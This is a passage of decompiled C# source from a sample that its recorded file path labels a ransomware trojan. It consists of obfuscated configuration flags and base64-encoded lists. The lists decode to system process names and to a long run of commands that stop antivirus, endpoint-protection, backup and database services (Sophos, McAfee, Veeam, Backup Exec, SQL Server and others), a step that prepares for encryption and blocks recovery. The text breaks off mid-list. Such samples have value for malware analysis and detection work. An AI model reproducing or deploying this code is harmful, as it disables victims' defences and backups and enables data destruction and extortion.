// Decompiled with JetBrains decompiler
// Type: kuMeqwHpurUBOD.BErRpdYOfQAwSr
// Assembly: Client-0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3332F4B9-4EB1-4ECC-A637-16FC36F853D6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.Win32.Generic-936a35ca214e9be1438c67a1153c854c28054994ce43f1eed39bb9dc52cb54dd.exe

using Microsoft.Win32;
using qftUKWQxmwkZg;
using SyaaQuaZnuVC;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using xQrQRQddRE;

namespace kuMeqwHpurUBOD
{
  internal class BErRpdYOfQAwSr
  {
    public static string plsJGHfMIwqB = "EVET";
    public static byte[] vzfvEbaMMJjzL = (byte[]) null;
    public static string ZrRHitKveMxniC = "NO";
    public static string FIbXXLCVARq = "100000000";
    public static List<string> nMCOBGfKnYn = new List<string>();
    public static List<string> nWvlGzDAqqn = new List<string>();
    public static string PZtctlGFWSPg = "NO";
    public static string FYndIeNOJJCR = "";
    public static string nFHjUKNuaEOj = "";
    public static string LbwMCCprGBEIfG = "NO";
    public static int kqWotmnIUhMss = 0;
    public static string NvrJrGCLFM = "YES";
    public static string qUnWPmXugZmhz = "NO";
    public static string ubsfdUxyfp = "NO";
    public static string DmygpjMfFmdLKl = "0";
    public static string eaZoKQQqQZielZ = "YES";
    public static string syfdPqgiPJltW = "NO";
    public static string QwQuntCagGTAD = "YES";
    public static string mEzYTStgRnr = "NO";
    public static List<string> HDBJOODGwwozS = new List<string>()
    {
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("bHNhc3MuZXhl"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3ZjaHN0LmV4ZQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("Y3Jjc3MuZXhl"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("Y2hyb21lMzIuZXhl"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("ZmlyZWZveC5leGU="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("Y2FsYy5leGU="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("bXlzcWxkLmV4ZQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("ZGxsaHN0LmV4ZQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("b3BlcmEzMi5leGU="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("bWVtb3AuZXhl"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3Bvb2xjdi5leGU="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("Y3RmbW9tLmV4ZQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("U2t5cGVBcHAuZXhl")
    };
    public static List<string> igfzwruhwWDXY = new List<string>();
    public static string kdbxgjgptILmf = "YES";
    public static string naEJQRwrPwowmubCfC = "NO";
    public static string EojNkoLUVXxT = "NO";
    public static List<string> TZzJBVGXhjZB = new List<string>();
    public static string jwPpkVDbeOk = "NO";
    private static string qygfGaCSBKuMaYS = "068a8f70-35fc-4d9e-bcf1-5b97f5f4affb";
    public static string dQHMXFnCEYNSw = "YES";
    public static string MEfeXGAJzJqj = "NO";
    public static List<string> yYvMwQIIRucF = new List<string>()
    {
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RhcnQgRG5zY2FjaGUgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RhcnQgRkRSZXNQdWIgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RhcnQgU1NEUFNSViAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RhcnQgdXBucGhvc3QgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBhdnBzdXMgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNY0FmZWVETFBBZ2VudFNlcnZpY2UgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBtZmV3YyAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBCTVIgQm9vdCBTZXJ2aWNlIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBOZXRCYWNrdXAgQk1SIE1URlRQIFNlcnZpY2UgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBEZWZXYXRjaCAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBjY0V2dE1nciAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBjY1NldE1nciAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTYXZSb2FtIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBSVFZzY2FuIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBRQkZDU2VydmljZSAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBRQklEUFNlcnZpY2UgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBJbnR1aXQuUXVpY2tCb29rcy5GQ1MgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBRQkNGTW9uaXRvclNlcnZpY2UgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBZb29CYWNrdXAgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBZb29JVCAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCB6aHVkb25nZmFuZ3l1IC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBzdGNfcmF3X2FnZW50IC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBWU05BUFZTUyAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCB2ZWVhbSAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBCYWNrdXBFeGVjRGl2ZWNpTWVkaWFTZXJ2aWNlIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBBY3JTY2gyU3ZjIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBDQVNBRDJEV2ViU3ZjIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBDQUFSQ1VwZGF0ZVN2YyAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBzb3Bob3MgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCDigJxBY3JvbmlzIFZTUyBQcm92aWRlcuKAnSAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNc0R0c1NlcnZlciAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBJSVNBZG1pbiAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU0V4Y2hhbmdlRVMgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCDigJxTb3Bob3MgQWdlbnTigJ0gL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBFcmFzZXJTdmMxMTcxMCAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCDigJxFbnRlcnByaXNlIENsaWVudCBTZXJ2aWNl4oCdIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCDigJxTUUwgQmFja3VwcyAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNc0R0c1NlcnZlcjEwMCAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBOZXRNc21xQWN0aXZhdG9yIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU0V4Y2hhbmdlSVMgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCDigJxTb3Bob3MgQXV0b1VwZGF0ZSBTZXJ2aWNl4oCdIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTYW1TcyAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBSZXBvcnRTZXJ2ZXIgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCDigJxTUUxzYWZlIEJhY2t1cCBTZXJ2aWNl4oCdIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNc0R0c1NlcnZlcjExMCAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBQT1AzU3ZjIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU0V4Y2hhbmdlTUdNVCAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCDigJxTb3Bob3MgQ2xlYW4gU2VydmljZeKAnSAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTTVRQU3ZjIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBSZXBvcnRTZXJ2ZXIkU1FMXzIwMDggL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCDigJxTUUxzYWZlIEZpbHRlciBTZXJ2aWNl4oCdIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBtc2Z0ZXNxbCRQUk9EIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTc3RwU3ZjIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU0V4Y2hhbmdlTVRBIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCDigJxTb3Bob3MgRGV2aWNlIENvbnRyb2wgU2VydmljZeKAnSAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBSZXBvcnRTZXJ2ZXIkU1lTVEVNX0JHQyAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCDigJxTeW1hbnRlYyBTeXN0ZW0gUmVjb3ZlcnnigJ0gL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU09MQVAkU1FMXzIwMDggL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBVSTBEZXRlY3QgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU0V4Y2hhbmdlU0EgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCDigJxTb3Bob3MgRmlsZSBTY2FubmVyIFNlcnZpY2XigJ0gL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBSZXBvcnRTZXJ2ZXIkVFBTIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCDigJxWZWVhbSBCYWNrdXAgQ2F0YWxvZyBEYXRhIFNlcnZpY2XigJ0gL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU09MQVAkU1lTVEVNX0JHQyAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBXM1N2YyAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU0V4Y2hhbmdlU1JTIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCDigJxTb3Bob3MgSGVhbHRoIFNlcnZpY2XigJ0gL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBSZXBvcnRTZXJ2ZXIkVFBTQU1BIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCDigJxab29seiAyIFNlcnZpY2XigJ0gL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU09MQVAkVFBTIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCDigJxhcGhpZG1vbml0b3JzZXJ2aWNl4oCdIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBtc2V4Y2hhbmdlYWR0b3BvbG9neSAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCDigJxTb3Bob3MgTUNTIEFnZW504oCdIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBBY3JTY2gyU3ZjIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU09MQVAkVFBTQU1BIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCDigJxpbnRlbChyKSBwcm9zZXQgbW9uaXRvcmluZyBzZXJ2aWNl4oCdIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBtc2V4Y2hhbmdlaW1hcDQgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCDigJxTb3Bob3MgTUNTIENsaWVudOKAnSAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBBUlNNIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU1NRTCRCS1VQRVhFQyAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCB1bmlzdG9yZXN2Y18xYWY0MGEgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCDigJxTb3Bob3MgTWVzc2FnZSBSb3V0ZXLigJ0gL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU1NRTCRFQ1dEQjIgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBhdWRpb2VuZHBvaW50YnVpbGRlciAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCDigJxTb3Bob3MgU2FmZXN0b3JlIFNlcnZpY2XigJ0gL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU1NRTCRQUkFDVElDRU1HVCAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCDigJxTb3Bob3MgU3lzdGVtIFByb3RlY3Rpb24gU2VydmljZeKAnSAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBCYWNrdXBFeGVjRGV2aWNlTWVkaWFTZXJ2aWNlIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU1NRTCRQUkFDVFRJQ0VCR0MgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCDigJxTb3Bob3MgV2ViIENvbnRyb2wgU2VydmljZeKAnSAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU1NRTCRQUk9EIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU1NRTCRQUk9GWEVOR0FHRU1FTlQgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBBbnRpdmlydXMgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU1NRTCRTQlNNT05JVE9SSU5HIC8="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU1NRTCRTQlNNT05JVE9SSU5HIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBBVlAgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU1NRTCRTSEFSRVBPSU5UIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBEQ0FnZW50IC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBiZWRiZyAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU1NRTCRTUUxfMjAwOCAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBFaHR0cFNydiAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNTVMgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU1NRTCRTUUxFWFBSRVNTIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBla3JuIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBtb3p5cHJvYmFja3VwIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU1NRTCRTWVNURU1fQkdDIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBFUFNlY3VyaXR5U2VydmljZSAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMDhSMiAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU1NRTCRUUFMgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBFUFVwZGF0ZVNlcnZpY2UgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBudHJ0c2NhbiAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU1NRTCRUUFNBTUEgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBFc2dTaEtlcm5lbCAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMDhSMiAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBFU0hBU1JWIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTRFJTVkMgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMTIgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBGQV9TY2hlZHVsZXIgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMDhSMiAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU1NRTEZETGF1bmNoZXIkUFJPRlhFTkdBR0VNRU5UIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBLQVZGUyAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTUUxXcml0ZXIgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU1NRTEZETGF1bmNoZXIkU0JTTU9OSVRPUklORyAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBLQVZGU0dUIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBWZWVhbUJhY2t1cFN2YyAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU1NRTEZETGF1bmNoZXIkU0hBUkVQT0lOVCAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBrYXZmc3NscCAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBWZWVhbUJyb2tlclN2YyAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU1NRTEZETGF1bmNoZXIkU1FMXzIwMDggL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBrbG5hZ2VudCAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBWZWVhbUNhdGFsb2dTdmMgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU1NRTEZETGF1bmNoZXIkU1lTVEVNX0JHQyAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBtYWNtbnN2YyAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBWZWVhbUNsb3VkU3ZjIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU1NRTEZETGF1bmNoZXIkVFBTIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBtYXN2YyAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU1NRTEZETGF1bmNoZXIkVFBTQU1BIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNQkFNU2VydmljZSAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBWZWVhbURlcGxveVN2YyAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU1NRTFNFUlZFUiAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNQkVuZHBvaW50QWdlbnQgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBWZWVhbUVudGVycHJpc2VNYW5hZ2VyU3ZjIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU1NRTFNlcnZlckFESGVscGVyIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNY0FmZWVFbmdpbmVTZXJ2aWNlIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBWZWVhbUh2SW50ZWdyYXRpb25TdmMgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU1NRTFNlcnZlckFESGVscGVyMTAwIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNY0FmZWVGcmFtZXdvcmsgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBWZWVhbU1vdW50U3ZjIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU1NRTFNlcnZlck9MQVBTZXJ2aWNlIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNY0FmZWVGcmFtZXdvcmtNY0FmZWVGcmFtZXdvcmsgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNeVNRTDU3IC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNY1NoaWVsZCAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBWZWVhbVJFU1RTdmMgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNeVNRTDgwIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNY1Rhc2tNYW5hZ2VyIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBPcmFjbGVDbGllbnRDYWNoZTgwIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBtZmVmaXJlIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCB3YmVuZ2luZSAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBSZXBvcnRTZXJ2ZXIkU1FMXzIwMDggL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBtZmVtbXMgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCB3YmVuZ2luZSAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBSRVN2YyAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBtZmV2dHAgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBzbXNfc2l0ZV9zcWxfYmFja3VwIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRCS1VQRVhFQyAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBNU1NRTCRTT1BIT1MgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRDSVRSSVhfTUVUQUZSQU1FIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBzYWNzdnIgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRDWERCIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTQVZBZG1pblNlcnZpY2UgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRFQ1dEQjIgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTQVZTZXJ2aWNlIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRQUkFDVFRJQ0VCR0MgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTZXBNYXN0ZXJTZXJ2aWNlIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRQUkFDVFRJQ0VNR1QgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTaE1vbml0b3IgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRQUk9EIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTbWNpbnN0IC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRQUk9GWEVOR0FHRU1FTlQgL3k="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTbWNTZXJ2aWNlIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRTQlNNT05JVE9SSU5HIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTbnRwU2VydmljZSAveQ=="),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRTSEFSRVBPSU5UIC95"),
      BErRpdYOfQAwSr.oMKRHTBqYRfOk("c3RvcCBzb3Bob3NzcHMgL3k="),
